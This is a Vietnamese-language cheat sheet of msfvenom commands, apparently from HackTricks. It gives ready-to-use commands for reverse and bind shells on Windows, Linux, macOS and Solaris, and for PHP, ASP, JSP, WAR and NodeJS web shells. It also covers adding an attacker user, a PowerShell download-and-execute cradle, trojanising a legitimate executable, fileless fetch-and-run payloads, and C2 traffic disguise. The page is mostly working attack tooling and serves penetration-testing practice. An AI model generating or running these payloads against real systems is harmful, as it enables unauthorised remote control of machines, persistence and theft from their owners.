# MSFVenom - Bảng tra cứu

{{#include ../../banners/hacktricks-training.md}}

---

## msfvenom cơ bản

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Dùng `-a` để chọn kiến trúc của payload và `--platform` để chọn nền tảng mục tiêu của payload.<sup>[[1]](#references)</sup>

## Liệt kê

```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```

Các lệnh này liệt kê những module payload và encoder có sẵn trong framework đã cài đặt.<sup>[[1]](#references)</sup>

## Các tham số phổ biến khi tạo shellcode

```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```

Các flag được hiển thị ở đây dùng để chọn ký tự không hợp lệ, định dạng đầu ra, encoder và số lần mã hóa.<sup>[[1]](#references)</sup>

## Định hình lưu lượng HTTP(S) Meterpreter

Metasploit 6.5 bổ sung tùy chọn `MALLEABLEC2` cho payload reverse HTTP(S) Meterpreter dạng staged và stageless. Profile có thể thay đổi URI, user agent, header request/response, vị trí connection ID và các kiểu mã hóa/wrapper body được hỗ trợ. Cả payload được tạo và handler của nó đều phải tải **cùng một profile cục bộ**. Request đầu tiên của payload staged để lấy Meterpreter stage không được định hình, vì vậy hãy ưu tiên payload stageless như `windows/x64/meterpreter_reverse_https` khi request đầu tiên cũng cần khớp với profile.<sup>[[3]](#references)</sup>

```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
  -f exe -o reverse_https.exe
```

Cấu hình handler phù hợp với payload và profile giống hệt:<sup>[[3]](#references)</sup>

```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```

Chỉ các chỉ thị được ghi nhận là đã triển khai mới ảnh hưởng đến lưu lượng; các khối cấu hình không được hỗ trợ vẫn có thể được phân tích cú pháp thành công nhưng không có tác dụng.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```

### Bind Shell

```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```

### Tạo người dùng

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```

### CMD Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```

### **Thực thi lệnh**

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```

### Encoder

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

> **Encoding không phải là AV evasion:** các encoder như `x86/shikata_ga_nai` chủ yếu hữu ích để đáp ứng các ràng buộc về bad-character. Encoding lặp lại không phải là kỹ thuật AV evasion đáng tin cậy.<sup>[[1]](#references)</sup>

### Nhúng bên trong tệp thực thi

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

## Linux Payloads

### Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

### Bind Shell

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```

### SunOS (Solaris)

```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

## **MAC Payloads**

### **Reverse Shell:**

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```

### **Bind Shell**

```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```

## **Payloads dựa trên Web**

### **PHP**

#### Reverse shel**l**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP/x

#### Reverse shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

### JSP

#### Reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```

### WAR

#### Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```

### NodeJS

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```

## **Payload bằng ngôn ngữ Script**

### **Perl**

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```

### **Python**

```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```

### **Bash**

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

## Bộ điều hợp fetch payload

Fetch payload tạo ra một lệnh để tiện ích có sẵn trên mục tiêu tải xuống và thực thi payload gốc bên dưới. Tên của chúng theo định dạng `cmd/<platform>/<fetch-protocol>/<served-payload>`; có các bộ điều hợp HTTP(S), SMB và TFTP, với lựa chọn trình tải xuống tùy thuộc vào nền tảng mục tiêu.<sup>[[2]](#references)</sup>

Ví dụ: tạo lệnh `wget` trên Linux để tải payload Meterpreter x64 từ cổng 8080 và kết nối ngược về cổng 4444:<sup>[[2]](#references)</sup>

```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
  FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
  LHOST=10.10.10.10 LPORT=4444 -f raw
```

Khởi chạy **fetch handler** với cùng các thiết lập; nó lưu trữ ELF đã tạo và đồng thời khởi chạy handler cho Meterpreter payload được phân phối:<sup>[[2]](#references)</sup>

```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```

Các tùy chọn phụ thuộc hữu ích gồm `FETCH_PIPE=true` để tạo lệnh HTTP(S) ngắn hơn khi được hỗ trợ và `FETCH_FILELESS=shell`, `shell-search` hoặc `python3.8+` để thực thi Linux ELF từ file descriptor ẩn danh. Các chế độ fileless yêu cầu Linux kernel 3.17 trở lên; hãy kiểm tra adapter cụ thể bằng `msfvenom -p <FETCH_PAYLOAD> --list-options` vì các tổ hợp được hỗ trợ sẽ khác nhau.<sup>[[2]](#references)</sup>



## References

- [1] [Cách sử dụng msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Cách sử dụng Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
